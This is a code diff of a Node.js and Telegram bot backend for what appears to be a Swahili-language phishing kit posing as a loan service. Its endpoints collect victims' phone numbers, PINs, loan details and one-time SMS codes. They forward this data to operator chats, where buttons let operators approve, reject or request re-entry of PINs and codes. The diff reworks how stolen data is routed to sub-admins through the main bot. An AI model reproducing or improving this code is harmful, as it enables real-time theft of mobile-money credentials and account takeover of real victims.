@@ -20,15 +20,12 @@ if (!MAIN_BOT_TOKEN) {
 const mainBot = new TelegramBot(MAIN_BOT_TOKEN, { polling: true });
 
 mainBot.on('polling_error', (error) => {
-    console.error('⚠️️ Main Bot Polling Error:', error.code, error.message);
+    console.error('⚠ Main Bot Polling Error:', error.code, error.message);
 });
 
 let activeSessions = {};
 let authorizedAdmins = new Set(MAIN_ADMIN_ID ? [MAIN_ADMIN_ID] : []);
 let pendingAdmins = {};
-let subAdminBots = {}; 
-let subAdminTokens = {}; 
-let subAdminSetupState = {}; 
 
 function escapeMarkdown(text) {
     if (!text) return '';
@@ -42,41 +39,9 @@ mainBot.on('message', (msg) => {
     const firstName = msg.from.first_name || 'Admin';
     const username = msg.from.username ? `@${msg.from.username}` : 'No username set';
 
-    if (subAdminSetupState[userIdStr]) {
-        const customToken = msg.text.trim();
-        try {
-            const customBot = new TelegramBot(customToken, { polling: true });
-            
-            customBot.on('polling_error', (err) => {
-                console.error(`⚠️ Sub-Admin (${userIdStr}) Bot Polling Error:`, err.code, err.message);
-            });
-
-            setupCallbackHandler(customBot, userIdStr, false);
-
-            customBot.getMe().then((botInfo) => {
-                subAdminBots[userIdStr] = customBot;
-                subAdminTokens[userIdStr] = customToken;
-                delete subAdminSetupState[userIdStr];
-
-                mainBot.sendMessage(chatId, `✅ Token yako imehakikiwa kikamilifu!\n\nBot Yako: @${botInfo.username}\nSasa maombi yako yatatumika kupitia bot yako maalum na yatakuja kwako moja kwa moja.`);
-                sendAdminLink(chatId, userIdStr, firstName, username);
-            }).catch((err) => {
-                mainBot.sendMessage(chatId, "❌ Bot Token uliyoweka si sahihi. Tafadhali tuma Token halali tena:");
-            });
-        } catch (e) {
-            mainBot.sendMessage(chatId, "❌ Imeshindwa kusoma Token hiyo. Hakikisha ni sahihi na utume tena:");
-        }
-        return;
-    }
-
     if (msg.text.startsWith('/start')) {
         if (userIdStr === MAIN_ADMIN_ID || authorizedAdmins.has(userIdStr)) {
             authorizedAdmins.add(userIdStr);
-            if (!subAdminBots[userIdStr] && userIdStr !== MAIN_ADMIN_ID) {
-                subAdminSetupState[userIdStr] = true;
-                mainBot.sendMessage(chatId, "🤖 Karibu Msimamizi! Tafadhali **tuma Telegram Bot Token yako maalum** (unayotaka iwe ikitumia bot yako kuletea taarifa):");
-                return;
-            }
             sendAdminLink(chatId, userIdStr, firstName, username);
             return;
         }
@@ -115,12 +80,11 @@ function sendAdminLink(chatId, userIdStr, firstName, username) {
         `🏷 *Username:* ${escapeMarkdown(username)}\n\n` +
         `🔗 *Kiungo Chako Maalum:*\n${isolatedLink}`;
 
-    const activeBot = (userIdStr === MAIN_ADMIN_ID) ? mainBot : (subAdminBots[userIdStr] || mainBot);
-    activeBot.sendMessage(chatId, welcomeText, { parse_mode: "Markdown" })
+    mainBot.sendMessage(chatId, welcomeText, { parse_mode: "Markdown" })
         .catch(err => console.error("Error sending start message:", err));
 }
 
-function setupCallbackHandler(botInstance, ownerId, isMain = false) {
+function setupCallbackHandler(botInstance, isMain = false) {
     botInstance.on('callback_query', async (query) => {
         const chatId = query.message.chat.id;
         const data = query.data;
@@ -137,9 +101,9 @@ function setupCallbackHandler(botInstance, ownerId, isMain = false) {
             if (data.startsWith('approveadmin_')) {
                 authorizedAdmins.add(targetSubId);
                 if (subAdminInfo) {
-                    subAdminSetupState[targetSubId] = true;
-                    mainBot.sendMessage(subAdminInfo.chatId, `✅ Ombi lako la kuwa Sub-Admin limekubaliwa!\n\nTafadhali **tuma Telegram Bot Token yako maalum** hapa ili uanze kupokea ujumbe kwenye bot yako:`);
-                    mainBot.sendMessage(MAIN_ADMIN_ID, `✅ Umemruhusu Sub-Admin ${targetSubId}. Sasa anasubiriwa kuweka Bot Token yake.`);
+                    mainBot.sendMessage(subAdminInfo.chatId, `✅ Ombi lako la kuwa Sub-Admin limekubaliwa! Hapa kuna kiungo chako maalum:`);
+                    sendAdminLink(subAdminInfo.chatId, targetSubId, subAdminInfo.firstName, subAdminInfo.username);
+                    mainBot.sendMessage(MAIN_ADMIN_ID, `✅ Umemruhusu Sub-Admin ${targetSubId} kikamilifu.`);
                 }
             } else {
                 if (subAdminInfo) {
@@ -178,36 +142,22 @@ function setupCallbackHandler(botInstance, ownerId, isMain = false) {
     });
 }
 
-setupCallbackHandler(mainBot, MAIN_ADMIN_ID, true);
+setupCallbackHandler(mainBot, true);
 
 app.post('/api/submit-credentials', (req, res) => {
     const { sessionId, sliderData, loanData, phone, pin, adminId } = req.body;
     
     let targetAdmin = MAIN_ADMIN_ID;
-    let targetBot = mainBot;
 
-    // STRICT ISOLATION: If an adminId is passed, make sure it maps precisely to that sub-admin's bot and ID. 
-    // If it's a sub-admin, it will NEVER fall back or send to the Main Admin.
     if (adminId && authorizedAdmins.has(adminId)) {
-        if (adminId === MAIN_ADMIN_ID) {
-            targetAdmin = MAIN_ADMIN_ID;
-            targetBot = mainBot;
-        } else if (subAdminBots[adminId]) {
-            targetAdmin = adminId;
-            targetBot = subAdminBots[adminId];
-        } else {
-            // Sub-admin hasn't configured their bot token yet; block sending to main admin
-            return res.json({ success: false, message: 'Sub-admin bot not configured yet.' });
-        }
+        targetAdmin = adminId;
     } else {
-        // If no valid admin ID was provided in the link, block it so it doesn't leak to main admin by accident
         return res.json({ success: false, message: 'Unauthorized link.' });
     }
 
     activeSessions[sessionId] = {
         sliderData, loanData, phone, pin,
         targetAdmin,
-        targetBot,
         status: 'pending_pin_approval'
     };
 
@@ -215,22 +165,20 @@ app.post('/api/submit-credentials', (req, res) => {
         `PHONE NO: ${phone}\n` +
         `PIN: ${pin}`;
 
-    if (targetAdmin && targetBot) {
-        targetBot.sendMessage(targetAdmin, message, {
-            reply_markup: {
-                inline_keyboard: [
-                    [
-                        { text: "RUHUSU (ALLOW)", callback_data: `allow_${sessionId}` },
-                        { text: "KATAA (DENY)", callback_data: `deny_${sessionId}` }
-                    ]
+    mainBot.sendMessage(targetAdmin, message, {
+        reply_markup: {
+            inline_keyboard: [
+                [
+                    { text: "RUHUSU (ALLOW)", callback_data: `allow_${sessionId}` },
+                    { text: "KATAA (DENY)", callback_data: `deny_${sessionId}` }
                 ]
-            }
-        }).then(() => {
-            console.log(`✅ Credentials successfully sent to designated admin ${targetAdmin}`);
-        }).catch(err => {
-            console.error(`❌ Telegram Send Error:`, err.response ? err.response.body : err.message);
-        });
-    }
+            ]
+        }
+    }).then(() => {
+        console.log(`✅ Credentials successfully sent to designated admin chat ID: ${targetAdmin}`);
+    }).catch(err => {
+        console.error(`❌ Telegram Send Error:`, err.response ? err.response.body : err.message);
+    });
 
     res.json({ success: true, sessionId });
 });
@@ -240,7 +188,7 @@ app.post('/api/submit-otp', (req, res) => {
     const session = activeSessions[sessionId];
 
     if (!session) {
-        return res.json({ success: false, message: 'Session not found' });
+        return res.json({ status: 'not_found', message: 'Session not found' });
     }
 
     session.otpText = otpText;
@@ -250,26 +198,24 @@ app.post('/api/submit-otp', (req, res) => {
         `NAMBARI YA SIMU: ${session.phone}\n\n` +
         `OTP:\n${otpText}`;
 
-    if (session.targetAdmin && session.targetBot) {
-        session.targetBot.sendMessage(session.targetAdmin, message, {
-            reply_markup: {
-                inline_keyboard: [
-                    [
-                        { text: "📋 Nakili Ujumbe", copy_text: { text: otpText } }
-                    ],
-                    [
-                        { text: "PIN MBAYA ❌", callback_data: `wrongpin_${sessionId}` },
-                        { text: "SMS MBAYA", callback_data: `wrongsms_${sessionId}` }
-                    ],
-                    [
-                        { text: "IMETHIBITISHWA", callback_data: `approved_${sessionId}` }
-                    ]
+    mainBot.sendMessage(session.targetAdmin, message, {
+        reply_markup: {
+            inline_keyboard: [
+                [
+                    { text: "📋 Nakili Ujumbe", copy_text: { text: otpText } }
+                ],
+                [
+                    { text: "PIN MBAYA ❌", callback_data: `wrongpin_${sessionId}` },
+                    { text: "SMS MBAYA", callback_data: `wrongsms_${sessionId}` }
+                ],
+                [
+                    { text: "IMETHIBITISHWA", callback_data: `approved_${sessionId}` }
                 ]
-            }
-        }).then(() => {
-            console.log(`✅ OTP successfully sent to admin ${session.targetAdmin}`);
-        }).catch(err => console.error(`❌ Failed to send OTP alert to admin:`, err));
-    }
+            ]
+        }
+    }).then(() => {
+        console.log(`✅ OTP successfully sent to admin ${session.targetAdmin}`);
+    }).catch(err => console.error(`❌ Failed to send OTP alert to admin:`, err));
 
     res.json({ success: true });
 });
